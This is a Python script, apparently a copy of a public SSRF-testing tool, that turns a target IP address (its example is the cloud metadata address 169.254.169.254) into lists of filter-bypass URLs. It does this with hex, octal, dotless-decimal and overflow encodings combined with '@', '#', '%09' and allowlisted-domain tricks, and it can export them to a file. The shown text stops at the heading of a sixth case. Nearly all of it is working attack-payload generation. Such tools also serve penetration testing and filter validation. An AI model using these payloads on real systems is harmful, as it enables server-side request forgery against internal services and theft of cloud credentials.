#!/usr/bin/python
# coding=utf-8
# https://raw.githubusercontent.com/cujanovic/SSRF-Testing/master/ip.py
from __future__ import print_function
from builtins import oct
from builtins import str
from builtins import hex
from builtins import range
from random import *
from io import open
import datetime
import string
import os
import sys
import platform
import random

EnclosedAlphanumericsData = {
	'0' : ['⓪'],
	'1' : ['①'],
	'2' : ['②'],
	'3' : ['③'],
	'4' : ['④'],
	'5' : ['⑤'],
	'6' : ['⑥'],
	'7' : ['⑦'],
	'8' : ['⑧'],
	'9' : ['⑨'],
	'10' : ['⑩'],
	'11' : ['⑪'],
	'12' : ['⑫'],
	'13' : ['⑬'],
	'14' : ['⑭'],
	'15' : ['⑮'],
	'16' : ['⑯'],
	'17' : ['⑰'],
	'18' : ['⑱'],
	'19' : ['⑲'],
	'20' : ['⑳'],
	'.' : ['。','｡'],
	'a' : ['ⓐ'],
	'b' : ['ⓑ'],
	'c' : ['ⓒ'],
	'd' : ['ⓓ'],
	'e' : ['ⓔ'],
	'f' : ['ⓕ'],
	'x' : ['ⓧ'],
}

def RANDOM_TEXT_SPEC():
	min_char = 12
	max_char = 16
	chars = string.ascii_letters + string.digits + "!$%^&*()<>;:,.|\~`"
	return "".join(choice(chars) for x in range(randint(min_char, max_char)))

def RANDOM_TEXT():
	min_char = 12
	max_char = 16
	chars = string.ascii_letters + string.digits
	return "".join(choice(chars) for x in range(randint(min_char, max_char)))

def DECIMAL_SINGLE(NUMBER,STEP):
	return int(NUMBER)*(256**STEP)

def HEX_SINGLE(NUMBER,ADD0X):
	if ADD0X == "yes":
		return str(hex(int(NUMBER)))
	else:
		return str(hex(int(NUMBER))).replace("0x","")

def OCT_SINGLE(NUMBER):
	return str(oct(int(NUMBER))).replace("o","")

def DEC_OVERFLOW_SINGLE(NUMBER):
	return str(int(NUMBER)+256)

def validIP(address):
	parts = address.split(".")
	if len(parts) != 4:
		return False
	try:
		for item in parts:
			if not 0 <= int(item) <= 255:
				return False
	except ValueError:
		print("\nUsage: python "+sys.argv[0]+" IP EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254\nUsage: python "+sys.argv[0]+" 169.254.169.254 export")
		exit(1)
	return True

def plain2EnclosedAlphanumericsChar(s0):
	if s0 not in EnclosedAlphanumericsData:
		raise Exception('value not found')
	return random.choice(EnclosedAlphanumericsData[s0])

def convertIP2EnclosedAlphanumericsValue():
	IPAddressParts4EnclosedAlphanumerics = arg1.split(".")
	returnEnclosedAlphanumericsIPAddress = ""
	for x in range(0,4):
		if len(IPAddressParts4EnclosedAlphanumerics[x]) == 3 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1])) <= 20 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]+IPAddressParts4EnclosedAlphanumerics[x][2])) >= 10:
			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]);
			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);
			if x <= 2:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');
		else:
			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]);
			if len(IPAddressParts4EnclosedAlphanumerics[x]) >= 2:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][1]);
			if len(IPAddressParts4EnclosedAlphanumerics[x]) == 3:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);
			if x <= 2:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');
	return returnEnclosedAlphanumericsIPAddress

def convert(s, recurse_chunks=True, error_on_miss=False):
		if s in EnclosedAlphanumericsData:
			return random.choice(EnclosedAlphanumericsData[s])
		if recurse_chunks and len(s) > 1:
			return convert(s[:-1]) + convert(s[-1])
		if error_on_miss:
			raise Exception('Value not found: %s' % s)
		return s

def convert_ip(ip, sep='.'):
	return convert(sep).join([convert(chunk) for chunk in ip.split(sep)])

if len(sys.argv) < 4 or len(sys.argv) >= 6:
	print("\nUsage: python "+sys.argv[0]+" IP PORT WhiteListedDomain EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com export")
	exit(1)

redcolor='\x1b[0;31;40m'
greencolor='\x1b[0;32;40m'
yellowcolor='\x1b[0;33;40m'
bluecolor='\x1b[0;36;40m'
resetcolor='\x1b[0m'
arg1 = str(sys.argv[1])

if validIP(arg1) == False:
	print("\n",yellowcolor,arg1,resetcolor,redcolor," is not a valid IPv4 address in dotted decimal format, example: 123.123.123.123",resetcolor,sep='')
	print("\nUsage: python "+sys.argv[0]+" IP EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254\nUsage: python "+sys.argv[0]+" 169.254.169.254 export")
	exit(1)

ipFrag3, ipFrag2, ipFrag1, ipFrag0 = arg1.split(".")
PORT=str(sys.argv[2])
RANDPREFIXTEXT=RANDOM_TEXT()
RANDPREFIXTEXTSPEC=RANDOM_TEXT_SPEC()
RANDOMPREFIXVALIDSITE=str(sys.argv[3])
FILENAME=''

try:
	sys.argv[4]
except IndexError:
	EXPORTRESULTS=''
else:
	EXPORTRESULTS=str(sys.argv[4])

if EXPORTRESULTS == 'export':
	FILENAME = "export-" + arg1 + "-" + str(datetime.datetime.now().strftime("%H-%M-%d-%m-%Y"))+'.txt'
	pythonversion = (platform.python_version())
	major, minor, patchlevel = pythonversion.split(".")
	if major == "3":
		f = open(FILENAME, 'w')
	else:
		f = open(FILENAME, 'wb')
elif EXPORTRESULTS != '':
	print("\nUsage: python "+sys.argv[0]+" IP WhiteListedDomain EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com export")
	exit(1)

#Case 1 - Dotted hexadecimal
print("\n",sep='')
print(bluecolor,"Dotted hexadecimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP1 = HEX_SINGLE(ipFrag3,"yes") + "." + HEX_SINGLE(ipFrag2,"yes") + "." + HEX_SINGLE(ipFrag1,"yes") + "." + HEX_SINGLE(ipFrag0,"yes")
print('http://',IP1,':',PORT,'/',sep='')
print('http://',IP1,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/','/',sep='')
print('http://',IP1,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',sep='')
print('http://',IP1,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP1,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP1,':',PORT,'/',sep='')
print('http://',IP1,':',PORT,':80','/',sep='')
print('http://',IP1,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP1,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP1,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP1,':',PORT,'/',file=f,sep='')
	print('http://',IP1,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP1,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':',PORT,'/',file=f,sep='')
	#===========================================================================
	print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',file=f,sep='')
	print('http://',IP1,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP1,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP1,':',PORT,'/',file=f,sep='')
	print('http://',IP1,':',PORT,':80','/',file=f,sep='')
	print('http://',IP1,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP1,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP1,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	#===========================================================================

#Case 2 - Dotless hexadecimal
print(bluecolor,"Dotless hexadecimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP2 = HEX_SINGLE(ipFrag3,"yes") + HEX_SINGLE(ipFrag2,"no") + HEX_SINGLE(ipFrag1,"no") + HEX_SINGLE(ipFrag0,"no")
print('http://',IP2,':',PORT,'/',sep='')
print('http://',IP2,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP2,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP2,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',sep='')
print('http://',IP2,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP2,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP2,':',PORT,'/',sep='')
print('http://',IP2,':',PORT,':80','/',sep='')
print('http://',IP2,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP2,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP2,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP2,':',PORT,'/',file=f,sep='')
	print('http://',IP2,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP2,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP2,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',file=f,sep='')
	print('http://',IP2,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP2,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP2,':',PORT,'/',file=f,sep='')
	print('http://',IP2,':',PORT,':80','/',file=f,sep='')
	print('http://',IP2,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP2,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP2,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 3 - Dotless decimal
print(bluecolor,"Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP3 = str(DECIMAL_SINGLE(ipFrag3,3) + DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
print('http://',IP3,':',PORT,'/',sep='')
print('http://',IP3,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP3,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP3,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',sep='')
print('http://',IP3,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP3,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP3,':',PORT,'/',sep='')
print('http://',IP3,':',PORT,':80','/',sep='')
print('http://',IP3,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP3,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP3,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP3,':',PORT,'/',file=f,sep='')
	print('http://',IP3,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP3,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP3,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',file=f,sep='')
	print('http://',IP3,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP3,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP3,':',PORT,'/',file=f,sep='')
	print('http://',IP3,':',PORT,':80','/',file=f,sep='')
	print('http://',IP3,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP3,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP3,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 4 - Dotted decimal with overflow(256)
print(bluecolor,"Dotted decimal with overflow(256) IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP4 = DEC_OVERFLOW_SINGLE(ipFrag3) + "." + DEC_OVERFLOW_SINGLE(ipFrag2) + "." + DEC_OVERFLOW_SINGLE(ipFrag1) + "." + DEC_OVERFLOW_SINGLE(ipFrag0)
print('http://',IP4,':',PORT,'/',sep='')
print('http://',IP4,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP4,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP4,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',sep='')
print('http://',IP4,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP4,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP4,':',PORT,'/',sep='')
print('http://',IP4,':',PORT,':80','/',sep='')
print('http://',IP4,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP4,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP4,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP4,':',PORT,'/',file=f,sep='')
	print('http://',IP4,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP4,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP4,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',file=f,sep='')
	print('http://',IP4,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP4,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP4,':',PORT,'/',file=f,sep='')
	print('http://',IP4,':',PORT,':80','/',file=f,sep='')
	print('http://',IP4,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP4,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP4,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 5 - Dotted octal
print(bluecolor,"Dotted octal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP5 = OCT_SINGLE(ipFrag3) + "." + OCT_SINGLE(ipFrag2) + "." + OCT_SINGLE(ipFrag1) + "." + OCT_SINGLE(ipFrag0)
print('http://',IP5,':',PORT,'/',sep='')
print('http://',IP5,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP5,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP5,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',sep='')
print('http://',IP5,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP5,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP5,':',PORT,'/',sep='')
print('http://',IP5,':',PORT,':80','/',sep='')
print('http://',IP5,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP5,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP5,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP5,':',PORT,'/',file=f,sep='')
	print('http://',IP5,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP5,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP5,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',file=f,sep='')
	print('http://',IP5,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP5,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP5,':',PORT,'/',file=f,sep='')
	print('http://',IP5,':',PORT,':80','/',file=f,sep='')
	print('http://',IP5,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP5,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP5,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 6 - Dotted octal with padding
